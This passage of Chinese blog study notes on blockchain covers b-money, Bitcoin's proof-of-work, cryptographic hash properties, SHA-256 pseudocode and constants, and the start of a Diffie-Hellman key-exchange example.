<li><p>创建钱。每个用户可以通过广播对以前未解决的计算问题的答案来获得钱。这样的计算的条件是必须很容易确定解决这个问题所需要的算力，解题所获得的钱与所付出的算力换算成一篮子货物的价值相等。例如，如果一道题在最经济的的情况下花了100小时的算力，而市场上需要花3篮子的货物来购买这100小时的算力，那么解开这道题产生的货币是3个单位。</p>
</li>
<li><p>转账。如果Alice（公钥A，K_A<em>）</em>决定向Bob（公钥B，K_B）转X单位的钱，那么她发送一条广播消息”我将给K_B X单位的钱“。在广播了这个消息后，系统中的每个用户将K_A用户中的钱扣除X单位；同时将B账户增加X单位。（除非会导致A用户为负）</p>
<blockquote>
<p>进一步解释:</p>
<p>如果Alice和Bob都是都是b-money的用户，那么他们都拥有公私钥对。在非对称密码体系中，公钥是公开的，所有人可见。公钥加密，私钥签名。在所有用户共同维护的账簿中，他们的公钥代表他们的身份。</p>
<p>加入Alice决定向Bob发2个单位的钱，那么Alice就会广播用自己的私钥签名的消息“从K_A发送2个单位的钱到K_B。”这条签名的信息向所有b-money用户证明，公钥A的主人想要将2个单位钱发送给公钥B。因此所有人都会更新他们的账簿。</p>
</blockquote>
</li>
<li><p>合同的影响。有效合同必须包括最大赔偿，以防每个参与方违约。它还应包括一个在发生争议时将进行仲裁的一方。合同的所有各方（包括仲裁员）必须在其生效之前广播其签名。在合同和所有签名的广播之后，每个参与者以其最高赔偿金额借记每一方的账户，并将由合同的安全散列标识的特殊账户记入最大赔偿金额。【也即保存到安全账户】如果每方的借记成功而没有产生负余额，则合同生效，否则合同将被忽略，账户将被回滚。示例合同如下:</p>
<blockquote>
<p>K_A同意在0：0：0 1&#x2F;1&#x2F;2000之前向K_B发送问题P的解。 K_B同意在0：0：0 1&#x2F;1&#x2F;2000之前支付K_A 100 MU（货币单位）。 K_C同意在发生争议时进行仲裁。 K_A同意在违约的情况下支付最多1000 MU。 K_B同意在违约的情况下支付最多200 MU。 K_C同意在违约的情况下支付最多500 MU。</p>
</blockquote>
</li>
<li><p>签订合同。如果合同无争议地结束，则各方广播一条签名消息“与SHA-1哈希H签订的合同无需赔偿即可结束”。或者可能“与SHA-1哈希H的合同以下列赔偿结束：……”在所有签名的广播中，每个参与者按其最高赔偿金额计入每一方的账户，删除合同账户，然后如果存在，则根据赔偿计划对每一方的账户进行贷记或借记。</p>
</li>
<li><p>执行合同。如果合同当事方即使在仲裁员的帮助下也无法就适当的结论达成一致，则每一方都会广播建议的赔偿&#x2F;罚款时间表以及任何有利于他的论据或证据。每个参与者确定实际的赔偿和&#x2F;或罚款，并相应地修改他的账户。</p>
</li>
</ol>
<p>DAi Wei自己提出，这个方案是不可行的，因为它依赖于同步的无阻塞的网络——也即，当Alice发给Bob两个单位的钱之后，如果她立刻又发出一条Alice发给Carol两个单位的钱的消息，那么所有人都能按照顺序接收到这两条消息。而不会出现部分人先收到Bob的消息，部分人先收到Carol的消息，（假设Alice只有两个单位的钱，那么第二条消息不会得到执行），从而造成分布式账本不一致的问题。</p>
<p>为了解决这个问题，Dai Wei提出了另一种方案，提出了部分机器担任服务器，由服务器来保管帐簿的概念。the affected participants of each transaction should verify that the message has been received and successfully processed by a randomly selected subset of the servers，而参与交易的用户需要向随机多个服务器查询，保证信息成功执行。</p>
<p>B-money特点:</p>
<ul>
<li>非常坚定的稳定币价. 在这个系统中，货币的总量没有限制，同时和现实中的一篮子的货物的价格相关联。</li>
</ul>
<p>B-money还没解决的问题:</p>
<ul>
<li>分布式一致性问题</li>
<li>工作量证明</li>
<li>无法追踪的交易</li>
</ul>
<h2 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h2><p>中本聪（匿名性做的最好的密码朋克的成员）提出的网络具有这样的特点:</p>
<blockquote>
<p>“该网络通过随机散列（hashing）对全部交易加上时间戳（timestamps），将它们合并入一个不断延伸的基于随机散列的工作量证明（proof-of-work）的链条作为交易记录，除非重新完成全部的工作量证明，形成的交易记录将不可更改。最长的链条不仅将作为被观察到的事件序列（sequence）的证明，而且被看做是来自CPU计算能力最大的池（pool）。只要大多数的CPU计算能力都没有打算合作起来对全网进行攻击，那么诚实的节点将会生成最长的、超过攻击者的链条”。</p>
</blockquote>
<p>比特币和B-money都保证了匿名性和可验证性;比特币引入PoW来解决分布式系统中一致性问题</p>
<p>网络运行步骤:</p>
<ol>
<li><p>新的交易向全网进行广播；</p>
</li>
<li><p>每一个节点都将收到的交易信息纳入一个区块中；</p>
</li>
<li><p>每个节点都尝试在自己的区块中找到一个具有足够难度的工作量证明；</p>
</li>
<li><p>当一个节点找到了一个工作量证明，它就向全网进行广播;</p>
<blockquote>
<p>出现分叉怎么处理?</p>
<p>假设甲矿工挖出A链347号块,然后立刻广播,并立刻去挖A链348号块,此时甲矿工收到B链的347号块,他决定先保留,以防B链更长,然后继续A链348号块,然而此时收到B链348号的消息,则甲矿工立刻放弃A链,开始挖B链349号块.此时甲矿工挖出的347号块奖励就没有了,块中所有的交易都放回交易池中,等待后续区块来打包</p>
</blockquote>
</li>
<li><p>当且仅当包含在该区块中的所有交易都是有效的且之前未存在过的，其他节点才认同该区块的有效性；</p>
</li>
<li><p>其他节点表示他们接受该区块，而表示接受的方法，则是在跟随该区块的末尾，制造新的区块以延长该链条，而将被接受区块的随机散列值视为先于新区块的随机散列值。</p>
</li>
</ol>
<p>双重支付问题:</p>
<blockquote>
<p>如果Alice试图用同一笔钱来支付两个交易，那么两个交易不可能都存在于区块链上，因为每一个交易都会被检查；即使Alice强制性地将两个交易都打包进一个区块，其他用户也不会接受包括了不正确交易的区块。如果有两个矿工分别将两笔交易打包进了自己的区块，并且都成功地完成了工作量证明，那么哪一个交易会真正地成为被大家公认的交易就要看运气了。</p>
<p>如果Bob不相信Alice，那么他可以等待Alice的支付消息被成功地打包进了区块，而且在其后又链接更多区块之后，才完成与Alice的交易。譬如Alice向Bob买一本书，按照10分钟生成一个区块的速度，Bob可以等一个小时，也即Alice的支付消息之后有了另外5个区块之后，才将书交给Alice。</p>
</blockquote>
<p>参考文献：</p>
<p>【1】<a href="https://link.zhihu.com/?target=http://www.itianwei.com/p2p/blockchain/2018-07-27/49351.html">DigiCash为什么失败？我们当面问了问“数字货币之父”David Chaum</a></p>
<p>【2】<a href="https://link.zhihu.com/?target=http://blog.sina.com.cn/s/blog_71851c8b0101c3kl.html">盲签名_DNT_EASY_新浪博客</a></p>
<p>【3】<a href="https://link.zhihu.com/?target=http://sceweb.sce.uhcl.edu/yang/teaching/csci5234WebSecurityFall2011/Chaum-blind-signatures.PDF">http://sceweb.sce.uhcl.edu/yang/teaching/csci5234WebSecurityFall2011/Chaum-blind-signatures.PDF</a></p>
<p>【4】<a href="https://link.zhihu.com/?target=http://wwwf.imperial.ac.uk/~rbellovi/writings/chaum.pdf">http://wwwf.imperial.ac.uk/~rbellovi&#x2F;writings&#x2F;chaum.pdf</a></p>
<p>【5】<a href="https://link.zhihu.com/?target=http://blog.koehntopp.de/uploads/chaum_fiat_naor_ecash.pdf">http://blog.koehntopp.de/uploads/chaum_fiat_naor_ecash.pdf</a></p>
<p>【6】<a href="https://link.zhihu.com/?target=http://www.weidai.com/bmoney.txt">http://www.weidai.com/bmoney.txt</a></p>
<p>【7】<a href="https://link.zhihu.com/?target=https://www.8btc.com/article/223424">创世文档：如果说比特币有一个初稿的话，那就是Wei Dai的B-Money</a></p>
<p>【8】<a href="https://link.zhihu.com/?target=https://bitcoinmagazine.com/articles/genesis-files-if-bitcoin-had-first-draft-wei-dais-b-money-was-it/">The Genesis Files: If Bitcoin Had a First Draft, Wei Dai’s B-Money Was It</a></p>
<p>【9】<a href="https://link.zhihu.com/?target=https://www.newyorker.com/magazine/2011/10/10/the-crypto-currency">The Crypto-Currency</a></p>
<p>【10】<a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Hashcash">https://en.wikipedia.org/wiki/Hashcash</a></p>
<h1 id="区块链技术3-密码学之哈希"><a href="#区块链技术3-密码学之哈希" class="headerlink" title="区块链技术3:密码学之哈希"></a>区块链技术3:密码学之哈希</h1><p>《比特币白皮书》:</p>
<blockquote>
<p>“所以，我们非常需要这样一种电子支付系统，它基于密码学原理而不基于信用，使得任何达成一致的双方，能够直接进行支付，从而不需要第三方中介的参与。”</p>
</blockquote>
<h2 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h2><p>加密哈希（cryptographic hash）:</p>
<blockquote>
<p>加密哈希是哈希函数的一种，它具有某些属性，使其适用于加密。通过加密哈希，它将任意大小的数据映射到固定大小的位串（散列），并被设计为单向函数，即一个不可逆的函数。从理想的加密散列函数输出重新创建输入数据的唯一方法是尝试对可能的输入进行暴力搜索，以查看它们是否产生匹配，或使用匹配哈希的彩虹表(里面记录了常见的hash值对应的内容)。布鲁斯施奈尔称单向散列函数是“现代密码学的主力”。输入数据通常称为消息（Message），输出（散列值或散列）通常称为消息摘要或简称为摘要（Digest）。</p>
</blockquote>
<p>理想的加密哈希函数有五个主要属性：</p>
<ol>
<li>确定性的。</li>
</ol>
<p>常见的哈希函数都满足这个特性。（只要计算过程中没有引入随机数&#x2F;调度，应该都满足？）</p>
<ol start="2">
<li>快速计算</li>
</ol>
<p>SHA-256算法的主要操作时异或运算，位运算非常快。</p>
<ol start="3">
<li>Hiding</li>
</ol>
<p>hiding就是知道哈希的结果不能倒推输入。简单来说，譬如 x mod 100这样的哈希函数，如果结果是1，那么x可能是1、101、201等无穷的数。从SHA族算法，从结果完全得不到输入的任何信息。</p>
<ol start="4">
<li><p>雪崩效应</p>
</li>
<li><p>抗冲突（collision-resistance）</p>
<p>当两个输入产生同一个输出，就发生了冲突。这里的抗冲突不是说肯定不会冲突，由鸽笼原理很容易看出，只要定义域大于值域，肯定会有冲突的。哈希函数的抗冲突指的是，虽然冲突就在那里，那就是找不到——或者说在可接受的时间内找不到。</p>
</li>
</ol>
<p>哈希函数在密码学中有着“瑞士军刀”的作用，有各种应用。</p>
<p>接下来，我们重点讨论三个特点：抗冲突、隐藏以及puzzle friendliness，以及它们的应用。</p>
<h3 id="抗冲突"><a href="#抗冲突" class="headerlink" title="抗冲突"></a>抗冲突</h3><ol>
<li><p><strong>抗冲突是指不可能找到两个x和y，其中x 不等于 y，而</strong> $H(x)&#x3D;H(y)$ 。</p>
<p>注意这里说的是不可能找到，而不是说不存在。实际上根据鸽笼原理，对于输出是256比特的SHA-256，那么只要找到2^256+1的输入，肯定可以找到至少两个值有冲突。</p>
<p>上面的方法是肯定可以找到冲突，把复杂度降低一点，利用生日攻击原理，如果随机挑选2^130+1的输入，有99.8%的概率可以找到冲突。</p>
<blockquote>
<p>生日悖论：生日悖论是指在不少于 23 个人中至少有两人生日相同的概率大于 50%。例如在一个 30 人的小学班级中，存在两人生日相同的概率为 70%。对于 60 人的大班，这种概率要大于 99%。这个数学事实十分反直觉，故称之为一个悖论。生日悖论的数学理论被应用于设计密码学攻击方法——生日攻击。<br>为什么是23呢？通过概率来计算一下。<br>假设房间中有n个人，那么n个人生日全部不相同的概率是:</p>
<p>$1*\frac{364}{365}*\frac{363}{365}*\frac{362}{365}…*\frac{365-n+1}{365}$至少有两个人相同的概率就是1-上述概率，计算得出的n和概率的关系是：</p>
</blockquote>
</li>
</ol>
<blockquote>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233988.png" alt="img"></p>
</blockquote>
<p>   抗冲突的应用:</p>
<blockquote>
<p>抗冲突的一个主要应用是信息摘要（message digest）。</p>
<p>对于抗冲突性的哈希函数而言，如果两个输入x和y不同，那么就可以认为H(x)和H(y)不同——否则的话，就违反了抗冲突性。</p>
<p>这个性质就可以做信息摘要。考虑2015年的xcode后门事件，因为国内的开发者从苹果官网下载xcode开发框架速度太慢，所以一些公司的开发人员直接从百度云上下载了某些人“好心”提供的版本。腾讯的安全实验发现很多app出现异常流量后发现源头在于使用的xcode，即使开发人员本身写的代码是正确的，经过篡改的xcode可以将恶意代码链入到app中。所以带来的一个问题是，当我们下载开源的软件使用时，怎么可以保证下载到的软件是官方的而不是经过第三方恶意修改过的呢？</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233990.jpg" alt="v2-307e48ac17cd19c71201191f50eb24af_1440w"></p>
<p>这是mysql的下载页面，可以看到在提供下载链接的同时，提供了MD5散列摘要。如果想要保证安全，可以在第三方下载软件之后，使用同样的算法做一次散列，如果相同，可以放心使用。</p>
</blockquote>
<h3 id="Hiding"><a href="#Hiding" class="headerlink" title="Hiding"></a>Hiding</h3><p><strong>Hiding的意思是如果有哈希函数的输出y，那么不可能找到x，使得h(x)&#x3D;y。</strong></p>
<p>关于hiding的含义前面已经解释过。现在的一个问题是，如果输入值本身是有限的，譬如在一个掷硬币的游戏中，如果扔出来head，那么就计算“head”的哈希值；如果扔出来tail，那么就计算”tail”的哈希值。那么在一次投掷过后，公布哈希值，能知道这次投掷的结果吗？</p>
<p>这个问题的特点是输入值的空间太小，如果想要知道输入是什么，只需要遍历一遍，把所有可能的值计算一下，然后进行比对就行。譬如在这里，只需要算两个值，那么肯定可以知道投掷的结果。所以也就失去了hiding的特点。</p>
<p>如果想对head&#x2F;tail的结果进行隐藏，有什么办法吗？</p>
<p>答案就是通过对简单的”head”和”tail”后面跟上一个随机性较强的串r，这样就能实现hiding。譬如，后面跟上长度为256bit的串，这样因为r的随机性足够强，即使head和tail很简单，也有足够的隐藏性。</p>
<p>hiding的应用:</p>
<blockquote>
<p>commitment（承诺）。承诺的场景，譬如，世界杯预测结果，每个人都把自己预测结果放在信封里，并且封上信封，放在桌上。这相当于做出了一个承诺。然后世界杯结束后，大家拆开信封，看看当初谁预测得最准确。</p>
<p>在密码学中，可以这样计算：</p>
<p>com :&#x3D; commit(msg, nonce), nonce是一个随机的秘密的数字（譬如256位）；然后公开com；相当于把公布了一个密封的信封；大家都知道做出了承诺，但是具体值是什么还没有公开</p>
<p>verify(com,msg,nonce)，如果要检验，则用户提供原始的msg和nonce，通过同样的方法计算，看com是否和commit计算出来的结果相同</p>
<p>（考虑一下，为什么需要一个Nonce？）</p>
<p>这里的commit就可以使用哈希函数来实现。</p>
</blockquote>
<h3 id="puzzle-friendliness"><a href="#puzzle-friendliness" class="headerlink" title="puzzle friendliness"></a>puzzle friendliness</h3><p>对于每一个可能的 n位输出 $y$,如果 $k$是随机性很强的值（譬如长度为256位的随机二进制串），那么找到一个合适的 $x$使得  $H(k||x)&#x3D;y$ 是不可能显著地低于  $2^n$的时间复杂度。</p>
<p>这个特点强调的是，如果给定特殊的哈希结果 $y$，并且输入中有一部分随机性很强的$k$，那么找到输入的另一个部分 $x$ 使得哈希的结果等于$y$，那么就只能依靠暴力搜索。</p>
<p>应用： search puzzle ；区块链中的工作量证明。</p>
<h2 id="哈希算法SHA-256"><a href="#哈希算法SHA-256" class="headerlink" title="哈希算法SHA-$256$"></a>哈希算法SHA-$256$</h2><ol>
<li>512-448 &#x3D; 64  字符串长度限定$2^{64}$, data + 1 + n个0 &#x3D; 448mod512,例如data有440bits,则补一个1,然后补7个零;data有952bits,则补一个1,然后补7个零;data有448bits,则补一个1,然后补511个0;data447bits,则补一个1,不用补0.最后一个块剩下64位,就是$2^x$ &#x3D; len(data),例如data位512bits,则最后64位为0x 0000000000000009</li>
<li>把512bits拆成16*32bits,扩展成64个32bits的w(w[i] :&#x3D; w[i-16] + s0 + w[i-7] + s1),k是64个常量(这64个常量来自于自然数中前64个质数{2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97…}，取立方根，前32bit而来。)</li>
<li>第一轮有8个初始hash值(8个数是前<strong>8个素数(2,3,5,7,11,13,17,19)取平方根</strong>，前32位小数),然后对这64个无符号型整数进行hash加密,加密64轮,然后会得到8个hash值,这8个hash值作为下一轮的输入.</li>
</ol>
<p>SHA-256是SHA-2中的一个算法。SHA-2，也即第二代安全散列算法（Secure Hash Algorithm 2），由美国国家安全局2001年公布的标准哈希算法，是SHA-1的后继。</p>
<p>SHA-2下包括六个不同的算法标准：SHA-224、SHA-256、SHA-384、SHA-512、SHA-512&#x2F;224、SHA-512&#x2F;256。这些不同的算法使用不同生成摘要的长度 、循环运行的次数，但算法的基本结构是一致的。现在已知SHA-2容易受到长度扩展攻击，所以推荐使用SHA-3来取代它。</p>
<p>对于任意长度的消息，SHA256都产生256bit长的哈希值，也即32字节，或者64位的16进制数，或者8个8位的16机制数 。:)</p>
<p>SHA-256的计算过程:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233991.jpg" alt="preview"></p>
<p align="center">来自wiki,SHA2的一轮计算</p>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233992.jpg" alt="img"></p>
<p>这里A～H共有8个，初始值分别是</p>
<p>h0 :&#x3D; 0x6a09e667<br>h1 :&#x3D; 0xbb67ae85<br>h2 :&#x3D; 0x3c6ef372<br>h3 :&#x3D; 0xa54ff53a<br>h4 :&#x3D; 0x510e527f<br>h5 :&#x3D; 0x9b05688c<br>h6 :&#x3D; 0x1f83d9ab<br>h7 :&#x3D; 0x5be0cd19</p>
<p>看一下，分别是8个16进制数，所以总共有256位，这个就叫做初始向量（IV）。这8个数是前<strong>8个素数(2,3,5,7,11,13,17,19)取平方根</strong>，前32位小数。最终生成的哈希值也是这么长，所以，每一轮的计算就是如上图所示，更新这8个值。</p>
<p>那怎么更新呢？</p>
<p><strong>每一轮计算64次。</strong>在上图中可以看到，除了A～H外，有两个输入，分别是 $w_t$和$k_t$ 。也即每一轮中有64个 $w$，以及64个 $k$ 。每个 $w$度为32bit，也即4个字节。64个 $w$来自于哈希函数的输入，也即，对于输入，不论长短，长的就分成每512bit一个块（64个字节），短的补足512bit。这64个字节构成了前16个 $w$,后面的48个 $w$过前面的16个生成。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i from <span class="number">16</span> to <span class="number">63</span></span><br><span class="line">        s0 := (w[i<span class="number">-15</span>] rightrotate <span class="number">7</span>) xor (w[i<span class="number">-15</span>] rightrotate <span class="number">18</span>) xor (w[i<span class="number">-15</span>] rightshift <span class="number">3</span>)</span><br><span class="line">        s1 := (w[i<span class="number">-2</span>] rightrotate <span class="number">17</span>) xor (w[i<span class="number">-2</span>] rightrotate <span class="number">19</span>) xor (w[i<span class="number">-2</span>] rightshift <span class="number">10</span>)</span><br><span class="line">        w[i] := w[i<span class="number">-16</span>] + s0 + w[i<span class="number">-7</span>] + s1</span><br></pre></td></tr></table></figure>



<p><strong>64个 $k$是64个常量</strong>，</p>
<p>k[0..63] :&#x3D;<br>0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,<br>0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,<br>0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2</p>
<p>这64个常量来自于自然数中前64个质数{2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97…}，取立方根，前32bit而来。</p>
<p>然后每一次的计算，</p>
<p>h :&#x3D; g<br>g :&#x3D; f<br>f :&#x3D; e<br>e :&#x3D; d <strong>+</strong> temp1<br>d :&#x3D; c<br>c :&#x3D; b<br>b :&#x3D; a<br>a :&#x3D; temp1 <strong>+</strong> temp2</p>
<p>可以看下伪代码：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Note: All variables are unsigned 32 bits and wrap modulo 232 when calculating</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Initialize variables</span><br><span class="line">(first 32 bits of the fractional parts of the square roots of the first 8 primes 2..19):</span><br><span class="line">h0 := 0x6a09e667</span><br><span class="line">h1 := 0xbb67ae85</span><br><span class="line">h2 := 0x3c6ef372</span><br><span class="line">h3 := 0xa54ff53a</span><br><span class="line">h4 := 0x510e527f</span><br><span class="line">h5 := 0x9b05688c</span><br><span class="line">h6 := 0x1f83d9ab</span><br><span class="line">h7 := 0x5be0cd19</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Initialize table of round constants</span><br><span class="line">(first 32 bits of the fractional parts of the cube roots of the first 64 primes 2..311):</span><br><span class="line">k[0..63] :=</span><br><span class="line">   0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,</span><br><span class="line">   0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,</span><br><span class="line">   0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,</span><br><span class="line">   0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,</span><br><span class="line">   0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,</span><br><span class="line">   0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,</span><br><span class="line">   0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,</span><br><span class="line">   0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Pre-processing:</span><br><span class="line">append the bit &#x27;1&#x27; to the message</span><br><span class="line">append k bits &#x27;0&#x27;, where k is the minimum number &gt;= 0 such that the resulting message</span><br><span class="line">    length (in bits) is congruent to 448(mod 512)</span><br><span class="line">append length of message (before pre-processing), in bits, as 64-bit big-endian integer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Process the message in successive 512-bit chunks:</span><br><span class="line">break message into 512-bit chunks</span><br><span class="line">for each chunk</span><br><span class="line">    break chunk into sixteen 32-bit big-endian words w[0..15]</span><br><span class="line"></span><br><span class="line">    Extend the sixteen 32-bit words into sixty-four 32-bit words:</span><br><span class="line">    for i from 16 to 63</span><br><span class="line">        s0 := (w[i-15] rightrotate 7) xor (w[i-15] rightrotate 18) xor(w[i-15] rightshift 3)</span><br><span class="line">        s1 := (w[i-2] rightrotate 17) xor (w[i-2] rightrotate 19) xor(w[i-2] rightshift 10)</span><br><span class="line">        w[i] := w[i-16] + s0 + w[i-7] + s1</span><br><span class="line"></span><br><span class="line">    Initialize hash value for this chunk:</span><br><span class="line">    a := h0</span><br><span class="line">    b := h1</span><br><span class="line">    c := h2</span><br><span class="line">    d := h3</span><br><span class="line">    e := h4</span><br><span class="line">    f := h5</span><br><span class="line">    g := h6</span><br><span class="line">    h := h7</span><br><span class="line"></span><br><span class="line">    Main loop:</span><br><span class="line">    for i from 0 to 63</span><br><span class="line">        s0 := (a rightrotate 2) xor (a rightrotate 13) xor(a rightrotate 22)</span><br><span class="line">        maj := (a and b) xor (a and c) xor(b and c)</span><br><span class="line">        t2 := s0 + maj</span><br><span class="line">        s1 := (e rightrotate 6) xor (e rightrotate 11) xor(e rightrotate 25)</span><br><span class="line">        ch := (e and f) xor ((not e) and g)</span><br><span class="line">        t1 := h + s1 + ch + k[i] + w[i]</span><br><span class="line">        h := g</span><br><span class="line">        g := f</span><br><span class="line">        f := e</span><br><span class="line">        e := d + t1</span><br><span class="line">        d := c</span><br><span class="line">        c := b</span><br><span class="line">        b := a</span><br><span class="line">        a := t1 + t2</span><br><span class="line"></span><br><span class="line">    Add this chunk&#x27;s hash to result so far:</span><br><span class="line">    h0 := h0 + a</span><br><span class="line">    h1 := h1 + b</span><br><span class="line">    h2 := h2 + c</span><br><span class="line">    h3 := h3 + d</span><br><span class="line">    h4 := h4 + e</span><br><span class="line">    h5 := h5 + f</span><br><span class="line">    h6 := h6 + g</span><br><span class="line">    h7 := h7 + h</span><br><span class="line"></span><br><span class="line">Produce the final hash value (big-endian):</span><br><span class="line">digest = hash = h0 append h1 append h2 append h3 append h4 append h5 append h6 append h7</span><br></pre></td></tr></table></figure>

<p>关于短的输入如何补足也有一些细节，在输入末尾进行填充，使输入长度在对512取模以后的余数是448。填充的具体过程：先补第一个比特为1，然后都补0，直到长度满足对512取模后余数是448。需要注意的是，信息必须进行填充，也就是说，即使长度已经满足对512取模后余数是448，补位也必须要进行，这时要填充512个比特。因此，填充是至少补一位，最多补512位。为什么余数是448呢?因为，还有需要有64位的数据表示原始输入的长度，加上这64bit的长度信息448+64&#x3D;512，刚好512位。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233993.jpg" alt="preview">Merkle-Damgard构造</p>
<p><strong>在区块链中的应用</strong></p>
<p>哈希在区块链中的用处包括：</p>
<ol>
<li>利用puzzle-friendliness的工作量证明，也即，要求生成一个新区块时，哈希值一定要是以一定数量的连续的0开始的；</li>
<li>对每个区块的内容进行哈希，后面的区块相当于一直在对前面的区块进行哈希，所以一般来说，如果一个区块之后如果跟上其他6个区块之后，一般认为该区块的内容已经被公认了，不可更改。</li>
</ol>
<p>参考文献：</p>
<p>【1】<a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Block_hashing_algorithm">Block hashing algorithm</a></p>
<p>【2】<a href="https://link.zhihu.com/?target=https://lopp.net/pdf/princeton_bitcoin_book.pdf">https://lopp.net/pdf/princeton_bitcoin_book.pdf</a></p>
<p>【3】<a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/SHA-2">SHA-2 - Wikipedia</a></p>
<p>【4】<a href="https://link.zhihu.com/?target=https://blog.csdn.net/u011583927/article/details/80905740">SHA256算法原理详解 - CSDN博客</a></p>
<h1 id="区块链技术4-密码学指非对称加密"><a href="#区块链技术4-密码学指非对称加密" class="headerlink" title="区块链技术4:密码学指非对称加密"></a>区块链技术4:密码学指非对称加密</h1><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p>对称密钥的问题主要在于：</p>
<ol>
<li>共同的密钥的协商。直接的面对面协商可能是不现实的，而任何其他方法都有可能泄露；</li>
<li>密钥的管理。最好对于每个用户的每次通信都使用不同的密钥；</li>
<li>对称加密算法不能提供身份验证，而在电子商务中，用户必须要确认自己隐私数据的接收方是真正的网站；</li>
</ol>
<h3 id="DH算法"><a href="#DH算法" class="headerlink" title="DH算法"></a>DH算法</h3><p>非对称加密的发展起源于1976年的Diffie-Hellman密钥交换算法。DH实际上并不是一种加密协议，它可以让双方在完全没有对方任何预先信息的条件下通过不安全的信道就密钥达成一致，这个密钥可以在后续的通信中作为对称密钥来加密。</p>
<p>DH算法过程:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233994.jpg" alt="preview"></p>
<p>DH协商过程，Alice和Bob首先挑选一个颜色（黄色），这个颜色是可以公开的（每次通信不同）；然后再各自挑选一个秘密的颜色（Alice橙色，Bob青色）。然后Alice和Bob各自将自己的秘密颜色和黄色进行混合，得到了另外的两个颜色（Alice橙褐色，Bob淡蓝色）。Alice和Bob分别将自己的颜色发给对方。Alice和Bob在收到对方发来的颜色后，再分别和自己的颜色相混合，此时，两人得到了一个相同的颜色（黄褐色）。</p>
<p>在这个过程中，攻击者Eve可以一直监听网络，并且获得Alice和Bob在网络上交换的所有信息。也即，可以获得黄色、橙褐色、淡蓝色这些信息。阻止Eve获得最终的黄褐色的是Alice和Bob分别挑选的秘密颜色，橙色和青色。也即，需要能够证明，即使Eve得到了黄色和橙褐色，Eve也不能推导出Alice的秘密颜色。</p>
<p>在数学上，DH算法的有效性依赖于计算离散对数的难度。也即，当已知大素数 $p$ 和它的一个原根（primitive root）$g$ ，对于给定的 $b$，要计算指数 $i$，是非常困难的（暴力破解），而给定$i$,计算$b$是非常容易的</p>
<p>再用一个具体的例子来解释DH:</p>
<ol>
<li><p>Alice和Bob通过交流,决定选择素数$p&#x3D;23$以及原根$g&#x3D;5$</p>
</li>
<li><p>Alice选择一个秘密整数$a&#x3D;4$,Bob选择一个秘密整数$b&#x3D;3$</p>
</li>
<li><p>Alice和Bob分别使用$p,g,a$和$b$计算出$A$和$B$</p>
<blockquote>
<p>$$<br>A&#x3D;g^amod(p)&#x3D;5^4mod(23)&#x3D;4<br>\<br>B&#x3D;g^bmod(p)&#x3D;5^3mod(23)&#x3D;10<br>$$</p>
</blockquote>
</li>
<li><p>Alice和Bob分别将这两个数字$A&#x3D;4$和$B&#x3D;10$通过网络发送给对方。</p>
</li>
